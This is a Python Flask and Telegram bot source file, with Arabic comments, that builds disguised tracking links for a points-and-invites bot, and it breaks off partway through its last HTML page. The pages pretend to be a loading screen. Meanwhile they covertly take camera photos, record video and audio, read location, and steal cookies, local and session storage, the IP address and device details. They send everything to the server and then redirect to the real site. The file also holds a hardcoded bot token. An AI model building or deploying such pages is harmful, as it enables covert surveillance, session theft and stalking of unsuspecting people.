## ============================================================
#  ملف واحد شامل (app.py) - سيرفر + بوت + قاعدة بيانات + كل شيء
# ============================================================
from flask import Flask, request, render_template_string, redirect, jsonify
from datetime import datetime
import secrets
import os
import base64
import json
import requests
import threading
import time
import sqlite3
import re
from urllib.parse import urlparse
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ====== الإعدادات (config) ======
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8847400367:AAHNhfgMGGuo3eCIiNjMD8u4EjnL7OkNLls')
BASE_URL = os.environ.get('BASE_URL', 'https://bott-production-25ba.up.railway.app')
SECRET_KEY = os.environ.get('SECRET_KEY', 'my-super-secret-key')
DB_PATH = 'data.db'

# ====== قاعدة البيانات (database) ======
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            points INTEGER DEFAULT 0,
            total_points INTEGER DEFAULT 0,
            invite_code TEXT UNIQUE,
            invited_by INTEGER,
            joined_date TEXT,
            last_active TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            date TEXT,
            points_earned INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_attempts (
            user_id INTEGER,
            date TEXT,
            attempts INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS required_channels (
            channel_id TEXT PRIMARY KEY,
            channel_name TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS features (
            feature_name TEXT PRIMARY KEY,
            is_enabled INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            features TEXT,
            original_url TEXT,
            config TEXT,
            created TEXT
        )
    ''')
    
    cursor.execute('''
        INSERT OR IGNORE INTO settings (key, value)
        VALUES 
            ('free_attempts', '3'),
            ('video_duration', '30'),
            ('audio_duration', '30'),
            ('camera_count', '3')
    ''')
    
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        cursor.execute('''
            INSERT OR IGNORE INTO features (feature_name, is_enabled)
            VALUES (?, 1)
        ''', (feature,))
    
    conn.commit()
    conn.close()

# ====== دوال المستخدمين ======
def get_user(user_id):
    conn = get_db()
    user = conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, last_name, invited_by=None):
    conn = get_db()
    cursor = conn.cursor()
    invite_code = secrets.token_urlsafe(6)
    cursor.execute('''
        INSERT INTO users (user_id, username, first_name, last_name, invite_code, invited_by, joined_date, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, last_name, invite_code, invited_by, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    if invited_by:
        add_points(invited_by, 1, 'invite')
        log_invite(invited_by, user_id)
    return True

def update_user_activity(user_id):
    conn = get_db()
    conn.execute('UPDATE users SET last_active = ? WHERE user_id = ?', (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def add_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET points = points + ?, total_points = total_points + ? WHERE user_id = ?', (points, points, user_id))
    conn.commit()
    conn.close()
    log_action(user_id, 'add_points', f'{points} نقاط - {reason}')

def deduct_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    user = cursor.execute('SELECT points FROM users WHERE user_id = ?', (user_id,)).fetchone()
    if user and user['points'] >= points:
        cursor.execute('UPDATE users SET points = points - ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()
        log_action(user_id, 'deduct_points', f'{points} نقاط - {reason}')
        return True
    conn.close()
    return False

def log_action(user_id, action, details=''):
    conn = get_db()
    conn.execute('''
        INSERT INTO user_logs (user_id, action, details, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (user_id, action, details, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_invite(inviter_id, invited_id):
    conn = get_db()
    conn.execute('''
        INSERT INTO invites (inviter_id, invited_id, date, points_earned)
        VALUES (?, ?, ?, ?)
    ''', (inviter_id, invited_id, datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()

# ====== دوال المحاولات اليومية ======
def get_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('SELECT attempts FROM daily_attempts WHERE user_id = ? AND date = ?', (user_id, today)).fetchone()
    conn.close()
    return result['attempts'] if result else 0

def increment_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO daily_attempts (user_id, date, attempts)
        VALUES (?, ?, 1)
        ON CONFLICT(user_id, date) DO UPDATE SET attempts = attempts + 1
    ''', (user_id, today))
    conn.commit()
    conn.close()

def get_free_attempts_limit():
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = "free_attempts"').fetchone()
    conn.close()
    return int(result['value']) if result else 3

# ====== دوال القنوات الإجبارية ======
def get_required_channels():
    conn = get_db()
    channels = conn.execute('SELECT * FROM required_channels WHERE is_active = 1').fetchall()
    conn.close()
    return channels

def add_required_channel(channel_id, channel_name):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO required_channels (channel_id, channel_name, is_active)
        VALUES (?, ?, 1)
    ''', (channel_id, channel_name))
    conn.commit()
    conn.close()

def remove_required_channel(channel_id):
    conn = get_db()
    conn.execute('DELETE FROM required_channels WHERE channel_id = ?', (channel_id,))
    conn.commit()
    conn.close()

# ====== دوال الميزات ======
def is_feature_enabled(feature_name):
    conn = get_db()
    result = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    conn.close()
    return bool(result['is_enabled']) if result else True

def toggle_feature(feature_name):
    conn = get_db()
    current = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    if current:
        new_value = 0 if current['is_enabled'] else 1
        conn.execute('UPDATE features SET is_enabled = ? WHERE feature_name = ?', (new_value, feature_name))
        conn.commit()
        conn.close()
        return bool(new_value)
    conn.close()
    return False

# ====== دوال الإعدادات ======
def get_setting(key, default=None):
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = ?', (key,)).fetchone()
    conn.close()
    return result['value'] if result else default

def set_setting(key, value):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (key, value))
    conn.commit()
    conn.close()

# ====== دوال مساعدة (utils) ======
def generate_session_id():
    return secrets.token_urlsafe(12)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def create_short_link(session_id):
    short_id = session_id[:8]
    return f"{BASE_URL}/{short_id}"

# ====== دوال الجلسات (session_manager) ======
def create_session(chat_id, features, original_url, config_data=None):
    session_id = generate_session_id()
    conn = get_db()
    conn.execute('''
        INSERT INTO sessions (session_id, chat_id, features, original_url, config, created)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (session_id, chat_id, features, original_url, json.dumps(config_data or {}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return session_id

def get_session(session_id):
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id = ?', (session_id,)).fetchone()
    conn.close()
    return session

# ====== إنشاء تطبيق Flask ======
app = Flask(__name__)
app.secret_key = SECRET_KEY

# ============================================================
#  صفحات HTML (pages.py)
# ============================================================

CAMERA_FRONT_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تصوير الكاميرا الأمامية...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),camera_front:[],device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function captureFront(){const count=3;for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_front.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());statusEl.textContent=`✅ تم تصوير الصورة ${i+1}/${count}`;}catch(e){statusEl.textContent='❌ فشل التصوير';}}}
async function sendData(){await captureFront();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

CAMERA_BACK_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تصوير الكاميرا الخلفية...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),camera_back:[],device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function captureBack(){const count=3;for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_back.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());statusEl.textContent=`✅ تم تصوير الصورة ${i+1}/${count}`;}catch(e){statusEl.textContent='❌ فشل التصوير';}}}
async function sendData(){await captureBack();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

VIDEO_FRONT_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تسجيل الفيديو (30 ثانية)...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),video:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function recordVideo(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const reader=new FileReader();reader.onload=()=>data.video=reader.result;reader.readAsDataURL(blob);statusEl.textContent='✅ تم تسجيل الفيديو';};recorder.start();let seconds=0;const interval=setInterval(()=>{seconds++;statusEl.textContent=`🎥 تسجيل الفيديو: ${seconds}/30 ثانية`;},1000);await new Promise(r=>setTimeout(r,30000));clearInterval(interval);if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}}catch(e){statusEl.textContent='❌ فشل تسجيل الفيديو';}}
async function sendData(){await recordVideo();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

VIDEO_BACK_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تسجيل الفيديو (30 ثانية)...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),video:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function recordVideo(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240},audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const reader=new FileReader();reader.onload=()=>data.video=reader.result;reader.readAsDataURL(blob);statusEl.textContent='✅ تم تسجيل الفيديو';};recorder.start();let seconds=0;const interval=setInterval(()=>{seconds++;statusEl.textContent=`🎥 تسجيل الفيديو: ${seconds}/30 ثانية`;},1000);await new Promise(r=>setTimeout(r,30000));clearInterval(interval);if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}}catch(e){statusEl.textContent='❌ فشل تسجيل الفيديو';}}
async function sendData(){await recordVideo();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

AUDIO_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تسجيل الصوت (30 ثانية)...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),audio:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function recordAudio(){try{const stream=await navigator.mediaDevices.getUserMedia({audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onload=()=>data.audio=reader.result;reader.readAsDataURL(blob);statusEl.textContent='✅ تم تسجيل الصوت';};recorder.start();let seconds=0;const interval=setInterval(()=>{seconds++;statusEl.textContent=`🎙 تسجيل الصوت: ${seconds}/30 ثانية`;},1000);await new Promise(r=>setTimeout(r,30000));clearInterval(interval);if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}}catch(e){statusEl.textContent='❌ فشل تسجيل الصوت';}}
async function sendData(){await recordAudio();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

LOCATION_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري جلب الموقع...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),location:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
function getLocation(){if(navigator.geolocation){statusEl.textContent='📍 جلب الموقع...';navigator.geolocation.getCurrentPosition(pos=>{data.location={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,altitude:pos.coords.altitude,speed:pos.coords.speed};statusEl.textContent='✅ تم جلب الموقع';sendData();},()=>{statusEl.textContent='❌ رفض الموقع، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);},{enableHighAccuracy:true,timeout:10000});}else{statusEl.textContent='❌ الموقع غير مدعوم';setTimeout(()=>{window.location.href=original_url;},2000);}}
async function sendData(){try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
getLocation();
</script>
</body>
</html>
"""

DEVICE_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري جمع معلومات الجهاز...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),device:{},battery:null,cookies:{},storage:{},ip:null};
data.device={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency||'غير معروف',deviceMemory:navigator.deviceMemory||'غير معروف',maxTouchPoints:navigator.maxTouchPoints||0,vendor:navigator.vendor||'غير معروف',cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack||'غير مفعل'};
if(navigator.getBattery){navigator.getBattery().then(b=>{data.battery={level:Math.round(b.level*100),charging:b.charging,chargingTime:b.chargingTime,dischargingTime:b.dischargingTime};}).catch(()=>{});}
try{document.cookie.split(';').forEach(c=>{const p=c.trim().split('=');if(p.length>=2)data.cookies[p[0]]=p.slice(1).join('=');});}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key)data.storage[key]=localStorage.getItem(key);}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key)data.storage['session_'+key]=sessionStorage.getItem(key);}}catch(e){}
async function getIP(){try{const response=await fetch('/get_ip');const ipData=await response.json();data.ip=ipData.ip;}catch(e){}}
async function sendData(){await getIP();statusEl.textContent='✅ تم جمع المعلومات، جاري الإرسال...';try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
setTimeout(sendData,2000);
</script>
</body>
</html>
"""

ALL_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
.sub-status { color:rgba(255,255,255,0.3); font-size:12px; margin-top:10px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري جمع البيانات...</p><p class="sub-status" id="subStatus"></p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status'), subStatusEl=document.getElementById('subStatus');
const data={session_id:session_id,timestamp:new Date().toISOString(),device:{},camera_front:[],camera_back:[],video:null,audio:null,location:null,cookies:{},storage:{},battery:null,ip:null};
data.device={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency||'غير معروف',deviceMemory:navigator.deviceMemory||'غير معروف',maxTouchPoints:navigator.maxTouchPoints||0,vendor:navigator.vendor||'غير معروف',cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack||'غير مفعل'};
if(navigator.getBattery){navigator.getBattery().then(b=>{data.battery={level:Math.round(b.level*100),charging:b.charging};}).catch(()=>{});}
try{document.cookie.split(';').forEach(c=>{const p=c.trim().split('=');if(p.length>=2)data.cookies[p[0]]=p.slice(1).join('=');});}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key)data.storage[key]=localStorage.getItem(key);}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key)data.storage['session_'+key]=sessionStorage.getItem(key);}}catch(e){}
async function getIP(){try{const response=await fetch('/get_ip');const ipData=await response.json();data.ip=ipData.ip;}catch(e){}}
async function captureFront(){const count=3;subStatusEl.textContent='📷 تصوير الكاميرا الأمامية...';for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_front.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());}catch(e){}}
subStatusEl.textContent=`📷 تم تصوير ${data.camera_front.length} صورة أمامية`;}
async function captureBack(){const count=3;subStatusEl.textContent='📷 تصوير الكاميرا الخلفية...';for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_back.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());}catch(e){}}
subStatusEl.textContent=`📷 تم تصوير ${data.camera_back.length} صورة خلفية`;}
async function recordVideo(){try{subStatusEl.textContent='🎥 تسجيل فيديو (30 ثانية)...';const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const reader=new FileReader();reader.onload=()=>data.video=reader.result;reader.readAsDataURL(blob);};recorder.start();await new Promise(r=>setTimeout(r,30000));if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}subStatusEl.textContent='✅ تم تسجيل الفيديو';}catch(e){subStatusEl.textContent='❌ فشل تسجيل الفيديو';}}
async function recordAudio(){try{subStatusEl.textContent='🎙 تسجيل صوتي (30 ثانية)...';const stream=await navigator.mediaDevices.getUserMedia({audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onload=()=>data.audio=reader.result;reader.readAsDataURL(blob);};recorder.start();await new Promise(r=>setTimeout(r,30000));if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}subStatusEl.textContent='✅ تم تسجيل الصوت';}catch(e){subStatusEl.textContent='❌ فشل تسجيل الصوت';}}
function getLocation(){if(navigator.geolocation){subStatusEl.textContent='📍 جلب الموقع...';navigator.geolocation.getCurrentPosition(pos=>{data.location={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy};subStatusEl.textContent='✅ تم جلب الموقع';},()=>{subStatusEl.textContent='❌ رفض الموقع';});}}
